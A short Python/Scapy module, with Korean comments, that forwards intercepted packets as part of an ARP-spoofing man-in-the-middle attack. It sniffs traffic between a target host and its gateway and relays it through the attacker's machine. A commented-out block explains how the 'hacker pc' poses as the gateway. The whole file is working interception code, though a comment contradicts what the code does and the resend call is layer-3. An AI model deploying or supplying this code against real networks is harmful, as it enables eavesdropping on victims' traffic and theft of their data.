from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP


clientIp = None
clientMac = None
gatewayIp = None
gatewayMac = None
myIp = None
myMac = None

stopFlag2 = False

## 자신한테 들어오는 패킷을 캡쳐한다
## target <-> gateway 사이의 패킷만을 캡쳐한다
def packet_forwarding():
    filterExpr = f"(src host {clientIp} or dst host {clientIp}) and ether dst {myMac}"
    sniff(prn=forwarding, count=0, filter=filterExpr, stop_filter=lambda x: stopFlag2, iface=conf.iface)
    

## 패킷 핸들러
## 캡쳐한 패킷의 출발지 맥 주소를 자신의 맥 주소로 변경하여 보냄
def forwarding(packet):
    newPacket = packet
    
    newPacket[Ether].dst = gatewayMac
    send(newPacket, verbose=False)
    
    '''
    target, gateway 모두에게 arp spoofing 공격을 한 뒤에
    hacker pc가 새로운 게이트웨이 역할을 하기 위한 패킷 변조 방법
    
    if packet[Ether].src == clientMac:
        newPacket[Ether].src = myMac
        newPacket[Ether].dst = gatewayMac
    elif packet[Ether].src == gatewayMac:
        newPacket[Ether].src = myMac
        newPacket[Ether].dst = clientMac
    '''

def set_variables(a, b, c, d, e, f):
    global clientIp, clientMac, gatewayIp, gatewayMac, myIp, myMac
    clientIp = a
    clientMac = b
    gatewayIp = c
    gatewayMac = d
    myIp = e
    myMac = f